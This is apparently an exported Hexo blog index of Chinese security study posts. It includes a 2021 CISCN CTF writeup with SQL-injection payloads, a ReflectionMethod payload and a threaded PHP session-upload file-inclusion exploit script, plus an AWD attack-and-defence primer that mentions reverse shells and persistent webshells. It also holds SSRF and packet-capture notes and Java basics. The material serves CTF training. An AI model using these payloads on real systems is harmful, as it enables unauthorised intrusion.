<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021年 CISCN writeup</title>
      <link href="17ffd8ef2cd0/"/>
      <url>17ffd8ef2cd0/</url>
      
        <content type="html"><![CDATA[<h1 id="2021年-CISCN-writeup"><a href="#2021年-CISCN-writeup" class="headerlink" title="2021年 CISCN writeup"></a>2021年 CISCN writeup</h1><h2 id="1-1-easy-sql"><a href="#1-1-easy-sql" class="headerlink" title="1.1 easy_sql"></a>1.1 easy_sql</h2><p>进行手动测试，发现可以进行报错注入。Payload 为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;) AND updatexml(1, concat(0x7e, (database()), 0x7e), 1)--</span><br></pre></td></tr></table></figure><p>尝试读取数据库表的表名，发现information关键字被过滤，猜了一下表名为 fl4g、flag，最后确定表名为 flag。</p><p>使用 join 爆出字段名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">as</span> a <span class="keyword">join</span> flag b)c</span><br><span class="line"><span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">as</span> a <span class="keyword">join</span> flag b <span class="keyword">using</span>(<span class="keyword">id</span>,<span class="string">`no`</span>))c</span><br><span class="line"><span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">as</span> a <span class="keyword">join</span> flag b <span class="keyword">using</span>(<span class="keyword">id</span>,<span class="string">`no`</span>,<span class="string">`29023c0e-87b4-4f21-9ba3-f515c88243e2`</span>))c</span><br></pre></td></tr></table></figure><p>使用 group 语句查询 flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(<span class="string">`29023c0e-87b4-4f21-9ba3-f515c88243e2`</span>) <span class="keyword">from</span> flag </span><br></pre></td></tr></table></figure><p><code>CISCN&#123;pN9yX-L8msl-YA6OI-WZ5QG-m</code>，只获得了一半的 flag。 </p><p>尝试绕过截断。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>((<span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(<span class="string">`29023c0e-87b4-4f21-9ba3-f515c88243e2`</span>) <span class="keyword">from</span> flag), <span class="number">30</span>, <span class="number">60</span>) </span><br></pre></td></tr></table></figure><p><code>-m7DeE-&#125;</code>，获得另一半的 flag。</p><p>最后拼接得到flag为：CISCN{pN9yX-L8msl-YA6OI-WZ5QG-m7DeE-}</p><h2 id="1-2-easy-source"><a href="#1-2-easy-source" class="headerlink" title="1.2 easy_source"></a>1.2 easy_source</h2><p>通过扫描目录，发现<code>.index.php.swo</code>泄漏源码。</p><p>发现和<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">fslh-writeup</a>题目非常相似，尝试利用 PHP 内置类中的 ReflectionMethod 来读取 User 类里面各个函数的注释。</p><p>最后发现flag也是在q函数的注释中，payload为：<code>?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code></p><h2 id="1-3-middle-source"><a href="#1-3-middle-source" class="headerlink" title="1.3 middle_source"></a>1.3 middle_source</h2><p>扫描目录可以发现文件 .listing，在 you_can_seeeeeeee_me.php 路径中可以看到 phpinfo 的信息。</p><p>通过 phpinfo 中给出的 session 地址，和首页进行任意文件包含，可以联想到利用PHP_SESSION_UPLOAD_PROGRESS 进行文件包含。</p><p>参考文章《<a href="https://www.cnblogs.com/NPFS/p/13795170.html">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a>》完成 expoit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://121.36.31.240:24071/&quot;</span></span><br><span class="line">COUNT = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">file = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Run</span>(<span class="params">threads_name</span>):</span></span><br><span class="line">    <span class="keyword">global</span> COUNT</span><br><span class="line">    read_value = COUNT</span><br><span class="line"></span><br><span class="line">    resp = requests.post(</span><br><span class="line">    url=url,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php echo &quot;slug01sh&quot;;print_r(scandir(&quot;/etc/geecbbgagc/adbjhijbed/fhbccehdff/bafebihfee/efbdacbhae&quot;)); ?&gt;&#x27;</span>, <span class="comment"># session内容</span></span><br><span class="line">        <span class="string">&#x27;cf&#x27;</span>:<span class="string">&#x27;../../../../../../var/lib/php/sessions/ieadabjdfh/sess_flag&#x27;</span>, <span class="comment"># 文件名称</span></span><br><span class="line">        <span class="string">&#x27;&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;, <span class="comment"># !</span></span><br><span class="line">    files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, file)&#125;, </span><br><span class="line">    cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;flag&quot;</span>&#125;, <span class="comment"># ! PHPSESSID</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;slug01sh&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        print(resp.text)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;COUNT in Thread-%s is %d&quot;</span> % (str(threads_name), read_value))</span><br><span class="line">    COUNT = read_value + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        t = threading.Thread(target=Run,args=(j,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(threads)):</span><br><span class="line">        threads[i].join()</span><br><span class="line">    print(<span class="string">&quot;Finally, The COUNT is %d&quot;</span> % (COUNT,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>在 data 的 PHP_SESSION_UPLOAD_PROGRESS 字段写入需要执行的代码，最后读到 flag 位于 <code>/etc/geecbbgagc/adbjhijbed/fhbccehdff/bafebihfee/efbdacbhae</code>，文件名为 fl444444g。</p><p>利用 index.php 的任意文件读取，即可得到 flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWD入门12问</title>
      <link href="88e5b482994b/"/>
      <url>88e5b482994b/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210506094146.png"></p><p>（图片说明：AWD需要抢时间，提前进行充分的准备，尽量能使用脚本一键利用，而不是像解题模式慢慢的测试）</p><h2 id="0x01-AWD是什么？AWD比赛形式是怎样的？"><a href="#0x01-AWD是什么？AWD比赛形式是怎样的？" class="headerlink" title="0x01 AWD是什么？AWD比赛形式是怎样的？"></a>0x01 AWD是什么？AWD比赛形式是怎样的？</h2><p>AWD的全称是Attack With Defense，攻击成功会得分，但是如果被别人攻击就会扣分（防守弱）。</p><p>AWD的一般流程：</p><ol><li>出题方会给每支队伍部署「相同」环境的机器。</li><li>拿到机器后，每支队伍会有加固时间或者没有加固时间，具体看比赛举办方。</li><li>每个服务，数据库，主机上都存在flag，定时刷新。通过攻击拿到flag之后，一般会提供指定的接口，下一次刷新之后，如果还存在该漏洞，可以继续利用该漏洞拿分。<blockquote><p><del>需要提交 flag 的脚本</del>（现场写吧，规则很可能不同）</p></blockquote></li></ol><hr><h2 id="0x02-AWD需要哪些基础知识？"><a href="#0x02-AWD需要哪些基础知识？" class="headerlink" title="0x02 AWD需要哪些基础知识？"></a>0x02 AWD需要哪些基础知识？</h2><p>防御</p><ol><li>流量回放：通过分析对方的攻击流量，知道自己的弱点，知道对方的弱点（可能对方没来得及加固）</li><li>Linux相关：WAF的使用，修复漏洞。</li></ol><p>Web攻击</p><ol><li>Web漏洞（针对不同服务，不一定是Web）</li><li>内网渗透（时间长的比赛需要）<blockquote><p>基本流程：信息收集、攻击端口、攻击Web服务、维持权限。（手快才是关键，🐶）</p></blockquote></li></ol><p>重点在于代码审计、自动化脚本编写的能力。</p><h2 id="0x03-队员应该怎么分工？"><a href="#0x03-队员应该怎么分工？" class="headerlink" title="0x03 队员应该怎么分工？"></a>0x03 队员应该怎么分工？</h2><p>大致可以分为攻击和防守。</p><p>负责两个方面：</p><ul><li>一方面负责防守加固、做基线、加WAF、流量回放等等。</li><li>一方面负责源码审计、写攻击脚本、维持权限、持续渗透，具体怎么安排都视三人能力而定。<blockquote><p>需要准备一些脚本、常见的命令。</p></blockquote></li></ul><h2 id="0x04-流程大致是怎样的？"><a href="#0x04-流程大致是怎样的？" class="headerlink" title="0x04 流程大致是怎样的？"></a>0x04 流程大致是怎样的？</h2><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>a.信息收集</p><ol><li>探测主机。利用nmap确认存活主机的IP，搞清楚网络拓扑。</li><li>探测端口。确认主机之后，探测端口。（也可以看自己的机器开了什么端口，所有的机器都是一样的）</li><li>探测端口服务。可以使用nmap扫描相关的漏洞（或者msf）。<blockquote><p>需要准备nmap相关的命令。</p><ul><li>扫描端口</li><li>扫描漏洞</li></ul></blockquote></li></ol><p>b.攻击端口</p><ol><li>弱密码攻击常见端口。</li><li>扫描端口存在的服务，是否存在漏洞。<blockquote><p>需要准备弱密码字典。</p></blockquote></li></ol><p>c. 攻击服务</p><ol><li>使用D盾等WAF查杀后门或WebShell，将自己电脑中的后门先关闭。</li><li>使用源码审计工具审核出比较明显的漏洞。（seay）</li><li>最后再尝试绕过文件上传、SQL注入、反序列化。<blockquote><p>需要再电脑中准备好 exp 库、漏洞库、各种扫描工具。</p></blockquote></li></ol><p>d. 权限维持</p><ol><li>反弹shell</li><li>不死马（不好不要直接用Webshell）<blockquote><p>需要了解一下权限维持相关的技术，以及脚本准备。</p></blockquote></li></ol><p>快速找 flag：</p><ol><li><code>tac `find / -iname flag*`</code></li><li><code>find / -name *flag*</code></li><li><code>grep -rn &quot;flag&quot; *</code></li></ol><h3 id="防御流程"><a href="#防御流程" class="headerlink" title="防御流程"></a>防御流程</h3><p>a. 让网站保持稳定。</p><ol><li>备份源码。</li><li>备份数据库。<blockquote><p>需要准备备份数据库、备份源码相关的命令。</p></blockquote></li></ol><p>b. 系统安全检查</p><ol><li>修改ssh、mysql的弱密码</li><li>关闭不该开启的端口<blockquote><p>准备相关安全检查的脚本。</p></blockquote></li></ol><p>c. 部署WAF</p><ol><li>部署WAF</li><li>验证WAF是否可用<blockquote><p>需要准备WAF相关的源码，以及部署相关的脚本。</p></blockquote></li></ol><p>d. 修改权限</p><ol><li>上传目录的执行权限。</li><li>MySQL不允许写文件。</li></ol><p>e. 部署文件监控脚本</p><ol><li>监控可读写的文件是否新增或者删除文件。</li></ol><p>f. 部署流量监控脚本，开启服务器日志记录。</p><ol><li>监控流量。</li><li>分析对方是如何攻击自己的。</li><li>用类似的手段攻击其他机器。（注意混淆流量）</li></ol><h2 id="0x05-有哪些需要注意的事情？"><a href="#0x05-有哪些需要注意的事情？" class="headerlink" title="0x05 有哪些需要注意的事情？"></a>0x05 有哪些需要注意的事情？</h2><ol><li>准备脚本。</li><li>优化攻击和防御流程。<blockquote><p>其他基础都在于平时的积累。</p></blockquote></li></ol><h2 id="0x6-Web狗需要具备的能力有哪些？"><a href="#0x6-Web狗需要具备的能力有哪些？" class="headerlink" title="0x6 Web狗需要具备的能力有哪些？"></a>0x6 Web狗需要具备的能力有哪些？</h2><ol><li>快速漏洞的反应能力。</li><li>快速编写脚本的能力。</li><li>一个好的心态。</li></ol><h2 id="0x07-当处于劣势时，应该怎么做？"><a href="#0x07-当处于劣势时，应该怎么做？" class="headerlink" title="0x07 当处于劣势时，应该怎么做？"></a>0x07 当处于劣势时，应该怎么做？</h2><ol><li>首先心态不要崩</li><li>抓流量，分析其他队伍的Payload，进行反打。</li><li>如果被种Webshell，那么可能其他机器也有Webshell，密码也一样，可以借机潜入。</li></ol><h2 id="0x08-如何防守？"><a href="#0x08-如何防守？" class="headerlink" title="0x08 如何防守？"></a>0x08 如何防守？</h2><p>在问题四中已经说过，主要关注以下几点：</p><ol><li>保护机器的稳定。</li><li>保持无后门。</li><li>分析流量。</li></ol><h2 id="0x09-有什么比较好的AWD框架？"><a href="#0x09-有什么比较好的AWD框架？" class="headerlink" title="0x09 有什么比较好的AWD框架？"></a>0x09 有什么比较好的AWD框架？</h2><p>逛了一圈，最完善的AWD框架已经被喝茶，停止更新，估计有很多问题。</p><ol><li><a href="https://github.com/SniperOJ/Attack-Defense-Framework">https://github.com/SniperOJ/Attack-Defense-Framework</a></li></ol><h2 id="0x10-D盾是什么？有没有更好的替代品？"><a href="#0x10-D盾是什么？有没有更好的替代品？" class="headerlink" title="0x10 D盾是什么？有没有更好的替代品？"></a>0x10 D盾是什么？有没有更好的替代品？</h2><p>D盾是一种Web后门查杀工具，能查找隐藏在Linux中的Web后门。</p><p>已经下载，感觉还不错。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210506191701.png"><br>在虚拟机中扫描后就卡了，算了，重新找个吧。</p><p>没找到替代品，文件少点就不会卡。</p><h2 id="0x11-awd怎么上WAF？上什么WAF？"><a href="#0x11-awd怎么上WAF？上什么WAF？" class="headerlink" title="0x11 awd怎么上WAF？上什么WAF？"></a>0x11 awd怎么上WAF？上什么WAF？</h2><p>WAF：</p><ul><li>AoiAWD：推荐。<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></li><li>awd-watchbird</li></ul><p>配置教程：</p><ol><li>AoiAWD：<a href="https://www.cnblogs.com/stayelegance/p/14393260.html">https://www.cnblogs.com/stayelegance/p/14393260.html</a><br>（没有实战经验）</li></ol><h2 id="0x12-了解完上面的基础知识应该做什么？"><a href="#0x12-了解完上面的基础知识应该做什么？" class="headerlink" title="0x12 了解完上面的基础知识应该做什么？"></a>0x12 了解完上面的基础知识应该做什么？</h2><p>找个靶场，尝试一下，毕竟在拼速度，肯定是亲自做过会更快，更容易拿分。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客新见解：发布即完结</title>
      <link href="9c416611969b/"/>
      <url>9c416611969b/</url>
      
        <content type="html"><![CDATA[<p>发布即完结。也就是，当文章发布后，这篇博客就不能进行修改。</p><blockquote><p>最理想的情况是不做任何的修改。不过如果有错别字或者其他问题，可以考虑进行微调（不要纵容自己）或者进行适当的补充。</p></blockquote><p>PS：我并没有对这个想法进行尝试，只是期望自己以后能以这种方式写博客。</p><hr><h1 id="1-原因"><a href="#1-原因" class="headerlink" title="1 原因"></a>1 原因</h1><p>下面我将阐述期望这么做的几个原因：</p><p><strong>原因 1：增强写博客的正反馈</strong></p><p>我深知，需要养成习惯，必须要重视正反馈。博客通常是通过阅读量、发布的文章数、评论等数据来获得的正反馈。</p><ul><li>发布的文章数比较多，看到满满的成果，自己会觉得非常安心，正反馈++。</li><li>自己写的文章受到别人的好评，正反馈++。</li><li>阅读量增加，正反馈++。</li></ul><p><strong>原因 2：降低写作压力，提高写作兴趣</strong>。</p><p>在前面几篇博客中，我都是按照「笔记」的方式来记录博客。这样的记录方法，可以将相关的知识点都放在同一篇博文下，便于自己查看相关的笔记。但这样记录也会有很多弊端，历史博客和新博文写在同一篇文章下，各种内容混杂难以排版，阅读体验差。如果要对以前的博文进行修改，又要进行无用的修改，会增加写作的压力。</p><p>所以我现在打算摒弃以前博客的写法。当文章发布的时候，就只会进行小幅度的修改。</p><p><strong>原因 3：提高博客文章的质量</strong></p><p>“发布即完结”</p><ul><li>需要取一个较好的文章标题，来让自己或别人快速理解整篇文章的内容。</li><li>需要在文章发布之前做比较细致的检查。如：错别字、格式排版，各种各样增强阅读体验的修改。</li></ul><hr><h1 id="2-实施"><a href="#2-实施" class="headerlink" title="2 实施"></a>2 实施</h1><ol><li><strong>创建草稿</strong></li></ol><p>Hexo 提供了 draft 的布局，当使用下面的命令行生成新的文章时，文章便会放到 <code>_drafts</code> 文件夹中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new draft <span class="string">&quot;博客新见解：发布即成品&quot;</span></span><br></pre></td></tr></table></figure><p><code>_drafts</code>相当于一个工作区域，保存自己当前正在写的文章。当写完文章之后，使用 <code>publish</code> 命令即可移动到<code>_posts</code>目录中，发布后的文章不再干扰后续的写作。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210418161324.png"></p><ol start="3"><li><strong>使用工具检查文章的错误</strong>（是否符合排版规范）</li></ol><p>我暂时采用 <a href="https://marketplace.visualstudio.com/items?itemName=ZhixiangZhang.mdlint#review-details">vscode 的检查插件</a>。</p><ol start="4"><li><strong>自己再次阅读</strong></li></ol><ul><li>逐字阅读。</li><li>放一段时间再读一遍。</li></ul><blockquote><p>做个有要求的博主。</p></blockquote><ol start="5"><li><strong>发布文章</strong></li></ol><p>使用下面的命令将自己的草稿进行发布。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish draft <span class="string">&quot;博客新见解：发布即成品&quot;</span></span><br></pre></td></tr></table></figure><p>那什么时候是一篇文章完结呢？将自己当前想表达的思想充分表达，这篇文章就可以进行收尾工作了。以后想表达类似的思想，可以考虑添加超链接。</p><ol start="6"><li><strong>等待评论以及回复评论</strong>（公开）</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络空间安全】服务器端请求伪造笔记（SSRF）</title>
      <link href="e66d3ad04164/"/>
      <url>e66d3ad04164/</url>
      
        <content type="html"><![CDATA[<p>我曾经在阅读《Web安全攻防》是摘录过一些SSRF的笔记，不过我觉得博客还是要写出自己的思考和经验才好。</p><blockquote><p>况且我现在正在统一自己的写作风格，采用问答的方式，仅提供关键思路，而不是教科书式的一步一步的写。</p></blockquote><h1 id="1-协议"><a href="#1-协议" class="headerlink" title="1 协议"></a>1 协议</h1><h2 id="0x01-gopher协议是什么？有什么用？"><a href="#0x01-gopher协议是什么？有什么用？" class="headerlink" title="0x01 gopher协议是什么？有什么用？"></a>0x01 gopher协议是什么？有什么用？</h2><p>gopher协议就像是是HTTP协议的前身，所以很多HTTP能做到的事情，gopher也能做到。</p><p>SSRF能利用这个协议拓展攻击面，如：</p><ul><li>发送GET请求</li><li>发送POST请求<br>使用上面的方法可以做到很多事情。</li><li>探测内网IP和端口</li><li>攻击内网的网站</li><li>攻击内网redis、memcache、mysql、fastcgi或其他服务</li></ul><h2 id="0x02-gopher协议怎么发送GET？"><a href="#0x02-gopher协议怎么发送GET？" class="headerlink" title="0x02 gopher协议怎么发送GET？"></a>0x02 gopher协议怎么发送GET？</h2><h2 id="0x03-gopher协议怎么发送POST？"><a href="#0x03-gopher协议怎么发送POST？" class="headerlink" title="0x03 gopher协议怎么发送POST？"></a>0x03 gopher协议怎么发送POST？</h2><h2 id="0x03-gopher协议怎么攻击redis？"><a href="#0x03-gopher协议怎么攻击redis？" class="headerlink" title="0x03 gopher协议怎么攻击redis？"></a>0x03 gopher协议怎么攻击redis？</h2>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
            <tag> gopher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计算机基础】网络抓包分析笔记</title>
      <link href="d1b122c9a430/"/>
      <url>d1b122c9a430/</url>
      
        <content type="html"><![CDATA[<p>在SSRF中经常会用到Gopher协议或者其他协议，来对内网的服务进行攻击。在使用Gopher协议的时候，我们需要将其他服务的数据包进行重放（使用Gopher协议重放）。</p><p>这也就意味着必须通过抓包来获得其他服务（MySQL、Redis）的数据包。</p><h1 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1 抓包"></a>1 抓包</h1><h2 id="0x01-如何抓Redis的数据包？"><a href="#0x01-如何抓Redis的数据包？" class="headerlink" title="0x01 如何抓Redis的数据包？"></a>0x01 如何抓Redis的数据包？</h2><p>当redis在本地时，需要抓取ol相关的网络接口（本地回环包），可以使用下面的命令找到相关的设备名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404193614.png"><br>（图片说明：lo0就是我的电脑的本地回环接口，即Loop back address）</p><p>使用socat进行端口转发。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span><br></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404194207.png"><br>（图片说明：打开另一个窗口，使用redis-cli和redis进行交互，即可抓到上图的数据包，第一个命令是<code>keys *</code>）</p><p>如果比较熟悉wireshark，可以考虑采用tcpdump。命令可能类似下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo0 port 4444 -w mysql.pcapng</span><br></pre></td></tr></table></figure><p>（ps：记得将上面的设备换成自己的本地回环接口，可能是ol）</p><h2 id="0x02-如何抓MySQL的数据包？"><a href="#0x02-如何抓MySQL的数据包？" class="headerlink" title="0x02 如何抓MySQL的数据包？"></a>0x02 如何抓MySQL的数据包？</h2><p>大部分的步骤都和redis相似。</p><p>MySQL的数据包有一个比较坑的点：mysql命令可能使用mysql.sock文件和数据库进行交互，而不是tcp。所以可能使用tcpdump抓不到包。</p><p>具体解决办法：指定host和port，使用下面的命令进行登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h 127.0.0.1 -P 3306</span><br></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404194739.png"><br>（图片说明：使用 -P（大P）来指定端口）</p><h1 id="2-分析"><a href="#2-分析" class="headerlink" title="2 分析"></a>2 分析</h1><h2 id="0x01-如何快速获得所有请求包的二进制？"><a href="#0x01-如何快速获得所有请求包的二进制？" class="headerlink" title="0x01 如何快速获得所有请求包的二进制？"></a>0x01 如何快速获得所有请求包的二进制？</h2><p>（获得数据包二进制码相当于获得了请求包文件）</p><p>拿到流量包，随便选一个包，追踪TCP流。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404195209.png"><br>（图片说明：打开pcapng的流量包）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210404195237.png"><br>（图片说明：注意下方的红色标注，选中后即可获得所有数据包的二进制数据）</p><h1 id="附录"><a href="#附录" class="headerlink" title="#附录"></a>#附录</h1><p>参考教程：</p><ol><li>利用gopher协议攻击(生成gopher协议payload)：<a href="https://blog.szfszf.top/article/9/">https://blog.szfszf.top/article/9/</a></li><li>Gopher SSRF攻击内网应用复现：<a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></li><li>SSRF攻击MySQL：<a href="https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/">https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark </tag>
            
            <tag> socat </tag>
            
            <tag> tcpdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计算机基础】Java审计基础学习</title>
      <link href="10aa19681a6d/"/>
      <url>10aa19681a6d/</url>
      
        <content type="html"><![CDATA[<p>最近开始尝试进行 Java 代码审计，但是很多 Java 方面的基础概念不太够。开始逐渐补一补 Java 的基础。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325162534.png"></p><h1 id="1-Java-基础"><a href="#1-Java-基础" class="headerlink" title="1 Java 基础"></a>1 Java 基础</h1><h2 id="0x01-Java-SE、Java-EE、Java-ME有何关系？"><a href="#0x01-Java-SE、Java-EE、Java-ME有何关系？" class="headerlink" title="0x01 Java SE、Java EE、Java ME有何关系？"></a>0x01 Java SE、Java EE、Java ME有何关系？</h2><p>简单来说，Java SE就是标准版，包含标准的JVM和标准库，而Java EE是企业版，它只是在Java SE的基础上加上了大量的API和库，以便方便开发Web应用、数据库、消息服务等，Java EE的应用使用的虚拟机和Java SE完全相同。</p><p>Java ME就和Java SE不同，它是一个针对嵌入式设备的“瘦身版”，Java SE的标准库无法在Java ME上使用，Java ME的虚拟机也是“瘦身版”。</p><p>根本区别：</p><ol><li>标准库不同</li><li>出发点不同。</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325192543.png"><br>（图片说明：Java EE&gt;Java SE&gt;Java ME）</p><h2 id="0x02-如何寻找合适的-Java-版本？"><a href="#0x02-如何寻找合适的-Java-版本？" class="headerlink" title="0x02 如何寻找合适的 Java 版本？"></a>0x02 如何寻找合适的 Java 版本？</h2><p>有些人说 Java 1.8，有些人说 Java 8.0。如果想要正确的下载 Java 版本，就需要使用到下面的表格：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325192952.png"></p><h2 id="0x03-JDK-和-JRE-是什么？"><a href="#0x03-JDK-和-JRE-是什么？" class="headerlink" title="0x03 JDK 和 JRE 是什么？"></a>0x03 JDK 和 JRE 是什么？</h2><ul><li>JDK：Java Development Kit</li><li>JRE：Java Runtime Environment</li></ul><p>简单地说，JRE就是运行Java字节码的虚拟机（运行 Java 程序的必须条件）。但是，如果只有Java源码，要编译成Java字节码，就需要JDK，因为JDK除了包含JRE，还提供了编译器、调试器等开发工具。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325193819.png"><br>（图片说明：JDK&gt;JRE&gt;JVM）</p><h2 id="0x04-JDK-中可用的命令行工具有哪些？"><a href="#0x04-JDK-中可用的命令行工具有哪些？" class="headerlink" title="0x04 JDK 中可用的命令行工具有哪些？"></a>0x04 JDK 中可用的命令行工具有哪些？</h2><ul><li>java：这个可执行程序其实就是JVM，运行Java程序，就是启动JVM，然后让JVM执行指定的编译后的代码；</li><li>javac：这是Java的编译器，它用于把Java源码文件（以.java后缀结尾）编译为Java字节码文件（以.class后缀结尾）；</li><li>jar：用于把一组.class文件打包成一个.jar文件，便于发布；</li><li>javadoc：用于从Java源码中自动提取注释并生成文档；</li><li>jdb：Java调试器，用于开发阶段的运行调试。</li></ul><h2 id="0x05-main-方法为什么那么丑？"><a href="#0x05-main-方法为什么那么丑？" class="headerlink" title="0x05 main 方法为什么那么丑？"></a>0x05 main 方法为什么那么丑？</h2><p> C 语言的 Hello World<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span 